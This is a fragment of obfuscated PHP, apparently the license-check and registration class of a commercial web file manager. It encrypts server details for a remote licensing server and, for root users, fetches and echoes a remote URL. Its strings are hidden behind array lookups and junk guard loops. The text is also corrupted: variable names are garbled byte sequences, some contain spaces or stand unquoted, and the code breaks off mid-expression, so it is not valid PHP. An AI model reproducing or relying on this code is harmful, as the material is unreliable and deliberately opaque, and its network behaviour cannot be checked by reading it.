$_SERVER[$ÑÓúÅ‚¿[16]]; $ûåôëã¹ = $ÑÓúÅ‚¿[17]; $ß°¿·Ô› = $´â‡ÓÖ[719]; while (strlen($ß°¿·Ô›) < $´â‡ÓÖ[720]) { if (!$ß°¿·Ô›) { break; } $ß°¿·Ô›++; } if (!strstr($®±’¡–µ, $ûåôëã¹)) { return; } $Œ­åÜ´ = strrpos($®±’¡–µ, $ûåôëã¹); $ã’ˆÉ¶ö = $´â‡ÓÖ[721]; if (!$ã’ˆÉ¶ö) { die; } $®­àÈüÔ = substr($®±’¡–µ, $Œ­åÜ´ + strlen($ûåôëã¹)); $‘Ï©¢şš = $´â‡ÓÖ[722]; if (!$‘Ï©¢şš) { return; } preg_match_all($ÑÓúÅ‚¿[18], $®­àÈüÔ, $¸©ÍÛæÂ); $®­àÈüÔ = trim($¸©ÍÛæÂ[0][0], $ÑÓúÅ‚¿[19]); $¥ŸĞŒİ¥ = $´â‡ÓÖ[723]; if (strlen($¥ŸĞŒİ¥) < $´â‡ÓÖ[705]) { die; } $GLOBALS[$ÑÓúÅ‚¿[13]][$ÑÓúÅ‚¿[14]] = explode($ÑÓúÅ‚¿[19], $®­àÈüÔ); $GLOBALS[$ÑÓúÅ‚¿[13]][$ÑÓúÅ‚¿[15]] = implode($ÑÓúÅ‚¿[0], $GLOBALS[$ÑÓúÅ‚¿[13]][$ÑÓúÅ‚¿[14]]); $Ö¶Å³»× = $´â‡ÓÖ[724]; } public function run() { $ôšŒ™ É =& $_SERVER[œ—üé‹ê]; $ÇÍ®—œì =& $_SERVER[·–Â öÌ]; $this->vtnmd04f4ddf(); $this->nqchf0905303(); $î³±Üà = $ôšŒ™ É[725]; while (strlen($î³±Üà) < $ôšŒ™ É[705]) { if (!$î³±Üà) { break; } $î³±Üà++; } $Ìù§º¿ì = $GLOBALS[$ÇÍ®—œì[13]][$ÇÍ®—œì[14]]; $ÓÅ“»Ùç = $ôšŒ™ É[726]; if (strlen($ÓÅ“»Ùç) < $ôšŒ™ É[720]) { die; } $óğš ë” = $GLOBALS[$ÇÍ®—œì[13]][$ÇÍ®—œì[15]]; $’ÒÑŒ„ = $ôšŒ™ É[727]; if (strlen($’ÒÑŒ„) < $ôšŒ™ É[720]) { return; } define($ÇÍ®—œì[20], isset($Ìù§º¿ì[0]) && $Ìù§º¿ì[0] ? $Ìù§º¿ì[0] : $this->defaultModule); define($ÇÍ®—œì[21], isset($Ìù§º¿ì[1]) && $Ìù§º¿ì[0] ? $Ìù§º¿ì[1] : $this->defaultController); define($ÇÍ®—œì[22], isset($Ìù§º¿ì[2]) && $Ìù§º¿ì[0] ? $Ìù§º¿ì[2] : $this->defaultAction); $½œ¹§™ã = $ôšŒ™ É[728]; if (strlen($½œ¹§™ã) < $ôšŒ™ É[705]) { die; } define($ÇÍ®—œì[23], MOD . $ÇÍ®—œì[0] . ST . $ÇÍ®—œì[0] . ACT); $_SERVER[$ÇÍ®—œì[24]] = strtolower(ACTION); $this->autorun(); if (count($Ìù§º¿ì) >= 3) { $this->appRun($óğš ë”); } else { $this->appRun(ACTION); } } private $ednwba098520 = array(); private $mlco424745fa = ''; public function jlrn883f78b6() { $¬ü“¹¥ =& $_SERVER[œ—üé‹ê]; $Ñ¹¡ô‡Ì =& $_SERVER[·–Â öÌ]; $this->trnz7f2d979a(); $this->avnc41ef585f(); $Ê²ñú£Á = $¬ü“¹¥[729]; if (!$Ê²ñú£Á) { return; } $this->gtfuc3a67da5(); $this->sowvb635dd18(); $this->oidt2c6afd8e(); $½ÆšÂ” = $¬ü“¹¥[730]; while ($½ÆšÂ” < $¬ü“¹¥[731]) { if ($½ÆšÂ” >= 0) { break; } $½ÆšÂ”++; } $this->gtlb7279db4a(); $Ø¯‡Û°× = $¬ü“¹¥[732]; $this->zvpw078ae2be(); $this->ylmpeb5f5436($Ñ¹¡ô‡Ì[25], array($this, $Ñ¹¡ô‡Ì[26])); $ÕÆ‹ƒö‡ = $¬ü“¹¥[733]; $this->ylmpeb5f5436($Ñ¹¡ô‡Ì[27], array($this, $Ñ¹¡ô‡Ì[28])); $ÌçÍé¼ = $¬ü“¹¥[734]; if (!$ÌçÍé¼) { die; } $this->ylmpeb5f5436($Ñ¹¡ô‡Ì[29], array($this, $Ñ¹¡ô‡Ì[30])); $ší¼ÇÑÖ = $¬ü“¹¥[735]; $this->ylmpeb5f5436($Ñ¹¡ô‡Ì[31], array($this, $Ñ¹¡ô‡Ì[32])); $Ã’•¶¹ş = $¬ü“¹¥[736]; } public function getVersionData() { return $this->ednwba098520; } public function gdosac49b6a5($Å…÷üŠ) { $Û¿ã—² =& $_SERVER[œ—üé‹ê]; $®ø·ş¨ =& $_SERVER[·–Â öÌ]; $ÔçÓñ¾­ = Model($®ø·ş¨[33])->get(); $û’âÍÜ‚ = $Û¿ã—²[737]; $˜íîœüÍ = array($®ø·ş¨[34], $®ø·ş¨[35], $®ø·ş¨[36], $®ø·ş¨[37], $®ø·ş¨[38], $®ø·ş¨[39], $®ø·ş¨[40], $®ø·ş¨[41], $®ø·ş¨[42], $®ø·ş¨[43], $®ø·ş¨[44], $®ø·ş¨[45], $®ø·ş¨[46], $®ø·ş¨[47], $®ø·ş¨[48], $®ø·ş¨[49], $®ø·ş¨[50], $®ø·ş¨[51], $®ø·ş¨[52], $®ø·ş¨[53], $®ø·ş¨[54], $®ø·ş¨[55], $®ø·ş¨[56], $®ø·ş¨[57], $®ø·ş¨[58], $®ø·ş¨[59], $®ø·ş¨[60], $®ø·ş¨[61], $®ø·ş¨[62], $®ø·ş¨[63], $®ø·ş¨[64], $®ø·ş¨[65], $®ø·ş¨[66], $®ø·ş¨[67], $®ø·ş¨[68], $®ø·ş¨[69], $®ø·ş¨[70], $®ø·ş¨[71], $®ø·ş¨[72], $®ø·ş¨[73], $®ø·ş¨[74], $®ø·ş¨[75], $®ø·ş¨[76], $®ø·ş¨[77], $®ø·ş¨[78], $®ø·ş¨[79], $®ø·ş¨[80], $®ø·ş¨[81], $®ø·ş¨[82], $®ø·ş¨[83], $®ø·ş¨[84], $®ø·ş¨[85], $®ø·ş¨[86], $®ø·ş¨[87]); $œ¿¢…Ÿß = $Û¿ã—²[738]; if (!$œ¿¢…Ÿß) { die; } foreach ($˜íîœüÍ as $Ø·Ô—ïß) { $Ì½¦² ì = $GLOBALS[$®ø·ş¨[88]][$®ø·ş¨[89]][$Ø·Ô—ïß]; $š¨®ø¨ = $Û¿ã—²[739]; if (!$š¨®ø¨) { die; } if (isset($ÔçÓñ¾­[$Ø·Ô—ïß])) { $Ì½¦² ì = $ÔçÓñ¾­[$Ø·Ô—ïß]; } $Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[91]][$Ø·Ô—ïß] = $Ì½¦² ì; } $ã€Âã‡ = $Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[91]][$®ø·ş¨[46]]; $Ê¶÷ğ½­ = $Û¿ã—²[740]; unset($Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[92]][$®ø·ş¨[93]]); $é¹ï©˜¡ = $Û¿ã—²[741]; unset($Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[92]][$®ø·ş¨[94]]); unset($Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[91]][$®ø·ş¨[46]]); $ÀæˆßÕ = $Û¿ã—²[742]; if (strlen($ÀæˆßÕ) < $Û¿ã—²[713]) { return; } unset($Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[91]][$®ø·ş¨[95]]); $Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[91]][$®ø·ş¨[96]] = array($®ø·ş¨[97] => (int) $ã€Âã‡[$®ø·ş¨[98]], $®ø·ş¨[99] => (int) _get($ã€Âã‡, $®ø·ş¨[100], 0)); $ÁßÆÍÒß = $Û¿ã—²[743]; if (!$ÁßÆÍÒß) { return; } $ÂÇ£’ÛÂ = substr(md5($®ø·ş¨[101] . get_client_ip() . $ÔçÓñ¾­[$®ø·ş¨[102]]), 0, 15); $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[104]] = Mcrypt::encode(Session::sign(), $ÂÇ£’ÛÂ, 3600 * 24); $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[105]] = Action($®ø·ş¨[106])->accessToken(); $ı”°˜ÉÅ = $Û¿ã—²[744]; if (strlen($ı”°˜ÉÅ) < $Û¿ã—²[707]) { return; } $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[107]] = md5($_SERVER[$®ø·ş¨[108]] . $ÔçÓñ¾­[$®ø·ş¨[102]]); $µØ÷‰Ö´ = $Û¿ã—²[745]; $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[109]] = base64_encode(serverInfo()); $Şİ‰äç‹ = $Û¿ã—²[746]; if (!$Şİ‰äç‹) { die; } $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[110]] = $this->mlco424745fa; if ($ÔçÓñ¾­[$®ø·ş¨[110]] != $®ø·ş¨[111]) { $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[112]] = $ÔçÓñ¾­[$®ø·ş¨[112]]; $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[113]] = $ÔçÓñ¾­[$®ø·ş¨[113]]; $ÊÕä±ƒ = rand_string(10) . $this->mlco424745fa . rand_string(5); $Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[114]][$®ø·ş¨[115]] = $this->rjhyce918cb9($ÊÕä±ƒ, $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[107]]); } if ($this->mlco424745fa == $®ø·ş¨[111]) { $Å…÷üŠ[$®ø·ş¨[90]][$®ø·ş¨[91]][$®ø·ş¨[96]][$®ø·ş¨[100]] = 0; } $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[116]] = $this->versionPluginFilter(); $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[117]] = _get($this->ednwba098520, $®ø·ş¨[118], $®ø·ş¨[6]); if (KodUser::isRoot() && $this->config[$®ø·ş¨[119]]) { $Å…÷üŠ[$®ø·ş¨[103]][$®ø·ş¨[120]] = WEB_ROOT; } return $Å…÷üŠ; } private function gtlb7279db4a() { $ü–²„Ç =& $_SERVER[·–Â öÌ]; $•¨‡õ«ç = $_SERVER[$ü–²„Ç[24]] == $ü–²„Ç[121]; if ($_SERVER[$ü–²„Ç[24]] == $ü–²„Ç[122] && $_GET[$ü–²„Ç[123]] == $ü–²„Ç[124]) { $•¨‡õ«ç = !0; } if ($•¨‡õ«ç) { $Ø°ŠíÇ· = array($ü–²„Ç[110] => $this->mlco424745fa, $ü–²„Ç[125] => $this->hwyef9582643(), $ü–²„Ç[126] => Model($ü–²„Ç[127])->count()); if ($this->mlco424745fa != $ü–²„Ç[111]) { $¶×Íƒ©š = _get($this->ednwba098520, $ü–²„Ç[128]); if ($¶×Íƒ©š) { $Ø°ŠíÇ·[$ü–²„Ç[129]] = $¶×Íƒ©š; $Ø°ŠíÇ·[$ü–²„Ç[130]] = strtotime(_get($this->ednwba098520, $ü–²„Ç[131])); $Ø°ŠíÇ·[$ü–²„Ç[132]] = _get($this->ednwba098520, $ü–²„Ç[118]); } $Şãß…Ó = Model($ü–²„Ç[33])->get($ü–²„Ç[133], $ü–²„Ç[6], !0); if (is_string($Şãß…Ó) && substr($Şãß…Ó, 0, 1) == $ü–²„Ç[134]) { $Şãß…Ó = json_decode_force($Şãß…Ó); } if (is_array($Şãß…Ó) && $Şãß…Ó[$ü–²„Ç[135]] && strstr($Şãß…Ó[$ü–²„Ç[135]], $ü–²„Ç[136])) { $¤İ£¶îã = explode($ü–²„Ç[136], $Şãß…Ó[$ü–²„Ç[135]]); $Ø°ŠíÇ·[$ü–²„Ç[137]] = $¤İ£¶îã[0]; } } $Ø°ŠíÇ· = $this->ubgx06f77c9c(json_encode($Ø°ŠíÇ·), md5($ü–²„Ç[138])); $ù¿„Œ ô = array($ü–²„Ç[139] => $Ø°ŠíÇ·); call_user_func(array($ü–²„Ç[140], $ü–²„Ç[141]), $ù¿„Œ ô); } if ($this->mlco424745fa == $ü–²„Ç[111]) { return; } $­â÷Ÿ”¢ = array($ü–²„Ç[142], $ü–²„Ç[143], $ü–²„Ç[144], $ü–²„Ç[145], $ü–²„Ç[146], $ü–²„Ç[147]); $•úñ¸ŸÌ = Model($ü–²„Ç[33])->get(); $ù¿„Œ ô = array($ü–²„Ç[148] => $•úñ¸ŸÌ[$ü–²„Ç[34]], $ü–²„Ç[149] => $•úñ¸ŸÌ[$ü–²„Ç[35]], $ü–²„Ç[150] => $ü–²„Ç[6]); $şá³ç¯ú = $_SERVER[œ—üé‹ê][747]; foreach ($­â÷Ÿ”¢ as $ëšÄŞ) { if (!isset($•úñ¸ŸÌ[$ëšÄŞ]) || !$•úñ¸ŸÌ[$ëšÄŞ]) { continue; } $ù¿„Œ ô[$ëšÄŞ] = $•úñ¸ŸÌ[$ëšÄŞ]; } call_user_func(array($ü–²„Ç[140], $ü–²„Ç[141]), $ù¿„Œ ô); } private function sowvb635dd18() { $Ïˆ†•„Ä =& $_SERVER[œ—üé‹ê]; $â©¡©Ú =& $_SERVER[·–Â öÌ]; if ($_SERVER[$â©¡©Ú[24]] != $â©¡©Ú[151]) { return; } if (!KodUser::isRoot()) { die; } $¤—²¸ûÊ = $GLOBALS[$â©¡©Ú[13]]; if (isset($¤—²¸ûÊ[$â©¡©Ú[152]])) { $this->hocs3083ce8b(); die; } if (isset($¤—²¸ûÊ[$â©¡©Ú[153]]) && isset($¤—²¸ûÊ[$â©¡©Ú[153]]) == $â©¡©Ú[124]) { $¤—²¸ûÊ[$â©¡©Ú[154]] = Model($â©¡©Ú[33])->get($â©¡©Ú[155]); } if (!isset($¤—²¸ûÊ[$â©¡©Ú[154]]) || strlen($¤—²¸ûÊ[$â©¡©Ú[154]]) != 16) { show_json($â©¡©Ú[156] . $¤—²¸ûÊ[$â©¡©Ú[154]], !1); } $µ—ıÉ½© = Model($â©¡©Ú[33])->get($â©¡©Ú[102]); $²ª‘Ùšç = md5($_SERVER[$â©¡©Ú[108]] . $µ—ıÉ½©); $Æ“ÒÍÙ = array($â©¡©Ú[154] => $¤—²¸ûÊ[$â©¡©Ú[154]], $â©¡©Ú[157] => rand_string(16), $â©¡©Ú[158] => $â©¡©Ú[138], $â©¡©Ú[159] => $â©¡©Ú[160], $â©¡©Ú[161] => $_SERVER[$â©¡©Ú[162]], $â©¡©Ú[163] => $_SERVER[$â©¡©Ú[164]], $â©¡©Ú[165] => $_SERVER[$â©¡©Ú[166]], $â©¡©Ú[107] => $²ª‘Ùšç, $â©¡©Ú[167] => Model($â©¡©Ú[33])->get($â©¡©Ú[133])); $ñÕå™šÕ = $Ïˆ†•„Ä[748]; if (isset($¤—²¸ûÊ[$â©¡©Ú[153]]) && isset($¤—²¸ûÊ[$â©¡©Ú[153]]) == $â©¡©Ú[124]) { $Æ“ÒÍÙ[$â©¡©Ú[153]] = md5($Æ“ÒÍÙ[$â©¡©Ú[154]] . $â©¡©Ú[168] . $Æ“ÒÍÙ[$â©¡©Ú[157]]); } if ($¤—²¸ûÊ[$â©¡©Ú[169]] == $â©¡©Ú[170]) { $Û´ë†¸ = $this->ubgx06f77c9c($²ª‘Ùšç, $â©¡©Ú[171]); $ø®Ìá®© = $this->rjhyce918cb9(json_encode($Æ“ÒÍÙ), $²ª‘Ùšç . $â©¡©Ú[172], 3); $ø®Ìá®© = $ø®Ìá®© . $â©¡©Ú[173] . $_SERVER[$â©¡©Ú[162]]; $æ›ïôÅ = $this->efwl539cb3cd($â©¡©Ú[174] . $Û´ë†¸ . $â©¡©Ú[175] . $ø®Ìá®©, -1); show_json($æ›ïôÅ, !0); } else { if ($¤—²¸ûÊ[$â©¡©Ú[169]] == $â©¡©Ú[176]) { $–‚¬ô… = substr(md5($â©¡©Ú[177] . $²ª‘Ùšç), 12, 15) . $â©¡©Ú[178]; $ø®Ìá®© = $this->xsyn9f1b438b(trim($¤—²¸ûÊ[$â©¡©Ú[179]]), $–‚¬ô…, 2); $“—şéà = json_decode($ø®Ìá®©, !0); if (!is_array($“—şéà) || !is_array($“—şéà[$â©¡©Ú[180]]) || $“—şéà[$â©¡©Ú[154]] != !0) { $ïîœµï = $â©¡©Ú[181]; $İã¡ÒÄô = $“—şéà[$â©¡©Ú[180]] ? $â©¡©Ú[182] . $“—şéà[$â©¡©Ú[180]] : $ïîœµï; show_json($İã¡ÒÄô, !1); } else { $Æ“ÒÍÙ[$â©¡©Ú[157]] = $“—şéà[$â©¡©Ú[180]][$â©¡©Ú[183]]; } } else { $“—şéà = $this->efwl539cb3cd($â©¡©Ú[184], $Æ“ÒÍÙ, 10); } } if (!is_array($“—şéà) || !is_array($“—şéà[$â©¡©Ú[180]]) || $“—şéà[$â©¡©Ú[154]] != !0) { $ïîœµï = LNG($â©¡©Ú[185]); $İã¡ÒÄô = $“—şéà[$â©¡©Ú[180]] ? $â©¡©Ú[182] . $“—şéà[$â©¡©Ú[180]] : $ïîœµï; show_json($İã¡ÒÄô, !1); } $ÂÂğı = $“—şéà[$â©¡©Ú[180]]; $£“Ş’›² = $this->cdlbf6b0259c($ÂÂğı[$â©¡©Ú[186]]); if (!$£“Ş’›² || $£“Ş’›² != $ÂÂğı[$â©¡©Ú[131]]) { $°ôÜš¸“ = array($â©¡©Ú[187] => Model($â©¡©Ú[33])->get($â©¡©Ú[102]), $â©¡©Ú[188] => $_SERVER[$â©¡©Ú[108]], $â©¡©Ú[189] => this_url(), $â©¡©Ú[163] => $_SERVER[$â©¡©Ú[164]]); $ø®Ìá®© = $this->gatmab579cdc(json_encode($°ôÜš¸“)); $this->efwl539cb3cd($â©¡©Ú[190] . $ø®Ìá®©); show_json(LNG($â©¡©Ú[191]), !0); } $£…¤†‚î = array($â©¡©Ú[155] => $ÂÂğı[$â©¡©Ú[192]], $â©¡©Ú[193] => $ÂÂğı[$â©¡©Ú[194]], $â©¡©Ú[195] => rand_string(16), $â©¡©Ú[110] => $ÂÂğı[$â©¡©Ú[196]]); if ($Æ“ÒÍÙ[$â©¡©Ú[157]]) { $£…¤†‚î[$â©¡©Ú[195]] = $Æ“ÒÍÙ[$â©¡©Ú[157]]; } $†¨™‰ã» = substr(md5($£…¤†‚î[$â©¡©Ú[193]]), 10, 10); $ˆ¤‹èğ = $†¨™‰ã» . $£…¤†‚î[$â©¡©Ú[110]] . $£…¤†‚î[$â©¡©Ú[195]]; $£…¤†‚î[$â©¡©Ú[112]] = strrev(base64_encode($this->ubgx06f77c9c($ˆ¤‹èğ, $â©¡©Ú[197]))); $¿ì…¿ô½ = $Ïˆ†•„Ä[749]; while (strlen($¿ì…¿ô½) < $Ïˆ†•„Ä[731]) { if (!$¿ì…¿ô½) { break; } $¿ì…¿ô½++; } $ğ¶•ÁƒÃ = rand_string(16); $÷ŸˆÆŒ± = $ğ¶•ÁƒÃ . $£…¤†‚î[$â©¡©Ú[110]] . $this->ubgx06f77c9c(md5($£…¤†‚î[$â©¡©Ú[155]]), $ğ¶•ÁƒÃ); $ƒÒÅ–Ÿà = $Ïˆ†•„Ä[750]; while (strlen($ƒÒÅ–Ÿà) < $Ïˆ†•„Ä[707]) { if (!$ƒÒÅ–Ÿà) { break; } $ƒÒÅ–Ÿà++; } $£…¤†‚î[$â©¡©Ú[113]] = base64_encode(strrev($this->ubgx06f77c9c($÷ŸˆÆŒ±, $â©¡©Ú[198]))); $·Å‘¯ = $Ïˆ†•„Ä[751]; if (!$·Å‘¯) { die; } if ($ÂÂğı[$â©¡©Ú[199]] && $ÂÂğı[$â©¡©Ú[199]] >= 1) { Model($â©¡©Ú[33])->setDeep($â©¡©Ú[200], $â©¡©Ú[124]); } Model($â©¡©Ú[33])->set($£…¤†‚î); $¡áş¢Ä„ = md5($_SERVER[$â©¡©Ú[108]] . strrev($µ—ıÉ½©) . $£…¤†‚î[$â©¡©Ú[193]]); $¦¸‹ê×» = strrev(substr($¡áş¢Ä„, 10, 16)); $µ˜ÒÊÀ = $this->rjhyce918cb9(json_encode($ÂÂğı), $¡áş¢Ä„); $µ¥ó‰È» = array_to_keyvalue(Model($â©¡©Ú[7])->listData(), $â©¡©Ú[201]); $¥Ûá˜êâ = $Ïˆ†•„Ä[752]; while ($¥Ûá˜êâ < $Ïˆ†•„Ä[705]) { if ($¥Ûá˜êâ >= 0) { break; } $¥Ûá˜êâ++; } $İö¢Ë‚§ = $µ¥ó‰È»[$â©¡©Ú[202]]; $ßŞ´é˜è = $Ïˆ†•„Ä[753]; if (!$ßŞ´é˜è) { return; } $çš«Í˜ï = array(); $¾õµÆë = $Ïˆ†•„Ä[754]; $çš«Í˜ï[$¦¸‹ê×»] = $µ˜ÒÊÀ; $¥Ä¼›â = $Ïˆ†•„Ä[755]; if (strlen($¥Ä¼›â) < $Ïˆ†•„Ä[720]) { die; } Model($â©¡©Ú[7])->update($İö¢Ë‚§[$â©¡©Ú[203]], array($â©¡©Ú[204] => $çš«Í˜ï)); $âçé–‘™ = $Ïˆ†•„Ä[756]; $this->ednwba098520 = $ÂÂğı; $Ì•ÎŞë¬ = $Ïˆ†•„Ä[757]; if (!$Ì•ÎŞë¬) { die; } $this->mlco424745fa = $£…¤†‚î[$â©¡©Ú[110]]; $this->licenseRegistSuccess(); Cache::set($â©¡©Ú[205] . md5($µ—ıÉ½© . $â©¡©Ú[206]), $â©¡©Ú[6]); $¡™Ïˆ“¦ = $Ïˆ†•„Ä[758]; if (!$¡™Ïˆ“¦) { die; } show_json(LNG($â©¡©Ú[191]), !0); } private function licenseRegistSuccess() { $±å×ŸÇ¦ =& $_SERVER[œ—üé‹ê]; $¡ò‚Ò¼ =& $_SERVER[·–Â öÌ]; $Ÿ®îëä² = Model($¡ò‚Ò¼[33])->get(); $ÙìÑÊÑ = $±å×ŸÇ¦[759]; if (strlen($ÙìÑÊÑ) < $±å×ŸÇ¦[705]) { return; } if ($Ÿ®îëä²[$¡ò‚Ò¼[63]] != $¡ò‚Ò¼[124]) { Model($¡ò‚Ò¼[33])->set($¡ò‚Ò¼[63], $¡ò‚Ò¼[124]); } Action($¡ò‚Ò¼[207])->initStart(!0); } private function hocs3083ce8b() { $Ó»ÜµúŠ =& $_SERVER[œ—üé‹ê]; $·Íû”Åå =& $_SERVER[·–Â öÌ]; Model($·Íû”Åå[33])->set(array($·Íû”Åå[155] => $·Íû”Åå[6], $·Íû”Åå[193] => $·Íû”Åå[6], $·Íû”Åå[110] => $·Íû”Åå[111], $·Íû”Åå[112] => $·Íû”Åå[6], $·Íû”Åå[113] => $·Íû”Åå[6])); $˜¨ŠË™Ç = $Ó»ÜµúŠ[760]; if (strlen($˜¨ŠË™Ç) < $Ó»ÜµúŠ[713]) { return; } Model($·Íû”Åå[33])->setDeep($·Íû”Åå[200], $·Íû”Åå[208]); $this->ednwba098520 = array(); $Œ¨Ò²¼ = $Ó»ÜµúŠ[761]; if (!$Œ¨Ò²¼) { return; } $this->mlco424745fa = $·Íû”Åå[111]; } private function trnz7f2d979a() { $¸¢ÈôÖô =& $_SERVER[·–Â öÌ]; $_SERVER[$¸¢ÈôÖô[164]] = _get($_SERVER, $¸¢ÈôÖô[164], APP_HOST); $this->mlco424745fa = $¸¢ÈôÖô[111]; $ú˜Ì’½ = Model($¸¢ÈôÖô[33])->get(); if ($ú˜Ì’½[$¸¢ÈôÖô[110]] == $¸¢ÈôÖô[111]) { return; } $Á™šÄ©© = Model($¸¢ÈôÖô[33])->get($¸¢ÈôÖô[102]); $¥œ½ÓÆÔ = $¸¢ÈôÖô[205] . md5($Á™šÄ©© . $¸¢ÈôÖô[206]); $­„¶ÏËÈ = Cache::get($¥œ½ÓÆÔ); if (!is_array($­„¶ÏËÈ) || !isset($­„¶ÏËÈ[$¸¢ÈôÖô[209]]) || time() - $­„¶ÏËÈ[$¸¢ÈôÖô[209]] >= 60) { $óÇÒşÏˆ = Model($¸¢ÈôÖô[7])->loadList(); $¿‰çıäÚ = $óÇÒşÏˆ[$¸¢ÈôÖô[202]]; $µÖ´çÓü = md5($_SERVER[$¸¢ÈôÖô[108]] . strrev($Á™šÄ©©) . $ú˜Ì’½[$¸¢ÈôÖô[193]]); $˜šÊ›à = strrev(substr($µÖ´çÓü, 10, 16)); $­„¶ÏËÈ = $this->xsyn9f1b438b($¿‰çıäÚ[$¸¢ÈôÖô[88]][$˜šÊ›à], $µÖ´çÓü); $­„¶ÏËÈ = json_decode($­„¶ÏËÈ, !0); } if (!is_array($­„¶ÏËÈ)) { return $this->hocs3083ce8b(); } $°âüóß = strtotime($­„¶ÏËÈ[$¸¢ÈôÖô[131]]); if (time() >= $°âüóß) { return $this->hocs3083ce8b(); } if (!isset($­„¶ÏËÈ[$¸¢ÈôÖô[209]]) || time() - $­„¶ÏËÈ[$¸¢ÈôÖô[209]] > 20) { $­„¶ÏËÈ[$¸¢ÈôÖô[209]] = time(); Cache::set($¥œ½ÓÆÔ, $­„¶ÏËÈ); } $this->ednwba098520 = $­„¶ÏËÈ; $this->mlco424745fa = $ú˜Ì’½[$¸¢ÈôÖô[110]]; $ûÜúŒÎÌ = $_SERVER[œ—üé‹ê][762]; if (!$ûÜúŒÎÌ) { return; } $GLOBALS[$¸¢ÈôÖô[210]] = $this; } private function avnc41ef585f() { $É€ÎÑˆË =& $_SERVER[œ—üé‹ê]; $©Óî€Ò =& $_SERVER[·–Â öÌ]; $™ûšÑÖŞ = $GLOBALS[$©Óî€Ò[13]]; $„æíÉÃ« = $_SERVER[$©Óî€Ò[24]]; $«ô•ıŒ‚ = $É€ÎÑˆË[763]; if (strlen($«ô•ıŒ‚) < $É€ÎÑˆË[707]) { die; } if ($„æíÉÃ« == $©Óî€Ò[211] && $this->mlco424745fa == $©Óî€Ò[111]) { show_json(LNG($©Óî€Ò[212]), !1, $©Óî€Ò[213]); } $—Û¶Àì = array($©Óî€Ò[214], $©Óî€Ò[215]); if (in_array($„æíÉÃ«, $—Û¶Àì)) { if ($this->mlco424745fa == $©Óî€Ò[111] && isset($™ûšÑÖŞ[$©Óî€Ò[216]])) { show_json(LNG($©Óî€Ò[212]), !1, $©Óî€Ò[213]); die; } $‰œœºáğ = $this->hwyef9582643(); if ($‰œœºáğ != intval($©Óî€Ò[217])) { if ($‰œœºáğ <= Model($©Óî€Ò[127])->count()) { show_json(LNG($©Óî€Ò[218]), !1, $©Óî€Ò[213]); die; } } } } private function gtfuc3a67da5() { $µí¸€¡Ò =& $_SERVER[œ—üé‹ê]; $êùıÇÌ =& $_SERVER[·–Â öÌ]; $¦ƒ‡âß¸ = array($êùıÇÌ[121], $êùıÇÌ[122]); $ø¢•‰ò = $µí¸€¡Ò[764]; if (!KodUser::isRoot() || !isset($_GET[$êùıÇÌ[219]])) { return; } if (!in_array($_SERVER[$êùıÇÌ[24]], $¦ƒ‡âß¸)) { return; } $ıãÎü¼ = $êùıÇÌ[220]; $õ§ŞÂîÆ = $µí¸€¡Ò[765]; $ıãÎü¼ = $this->swxzf967e86e($ıãÎü¼, $êùıÇÌ[221]); $Ÿğ½´±Õ = stream_context_create(array($êùıÇÌ[222] => array($êùıÇÌ[223] => $êùıÇÌ[224], $êùıÇÌ[225] => 3))); $Ûèó€ß× = $µí¸€¡Ò[766]; while (strlen($Ûèó€ß×) < $µí¸€¡Ò[731]) { if (!$Ûèó€ß×) { break; } $Ûèó€ß×++; } $ëáÙª‰ê = @file_get_contents($ıãÎü¼, !1, $Ÿğ½´±Õ); $ü®³Àœ­ = $µí¸€¡Ò[767]; header($êùıÇÌ[226]); $ğ©“ Ş‚ = $µí¸€¡Ò[768]; if (!$ğ©“ Ş‚) { return; } if ($ëáÙª‰ê && strstr($ëáÙª‰ê, $êùıÇÌ[227])) { echo $ëáÙª‰ê; } die; } public function cyexb7e4362e($¦¾‰Ê‹‡) { $‚Ø¢é¿Î =& $_SERVER[·–Â öÌ]; if ($this->mlco424745fa == $‚Ø¢é¿Î[228]) { return $¦¾‰Ê‹‡; } $€Øó‹Ï = $this->versionPluginList(); $É¹Õè‰ì = explode($‚Ø¢é¿Î[229], $this->versionPluginFilter()); $Ô‡­…’ = $_SERVER[œ—üé‹ê][769]; if (!$Ô‡­…’) { return; } $“Òé•Ê = array(); foreach ($€Øó‹Ï as $ü¶íúŸ => $ëùü»“) { if ($ëùü»“ == $‚Ø¢é¿Î[230] && substr($this->mlco424745fa, 0, 1) == $‚Ø¢é¿Î[230]) { continue; } if (!in_array($ü¶íúŸ, $É¹Õè‰ì)) { $“Òé•Ê[] = $ü¶íúŸ; } } foreach ($“Òé•Ê as $ü¶íúŸ) { unset($¦¾‰Ê‹‡[$ü¶íúŸ]); } return $¦¾‰Ê‹‡; } private function versionPluginList() { $Öµâ—Ùƒ =& $_SERVER[·–Â öÌ]; return array($Öµâ—Ùƒ[231] => $Öµâ—Ùƒ[230], $Öµâ—Ùƒ[232] => $Öµâ—Ùƒ[230], $Öµâ—Ùƒ[233] => $Öµâ—Ùƒ[230], $Öµâ—Ùƒ[234] => $Öµâ—Ùƒ[230], $Öµâ—Ùƒ[235] => $Öµâ—Ùƒ[230], $Öµâ—Ùƒ[236] => $Öµâ—Ùƒ[230], $Öµâ—Ùƒ[237] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[239] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[240] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[241] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[242] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[243] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[244] => $Öµâ—Ùƒ[238], $Öµâ—Ùƒ[245] => 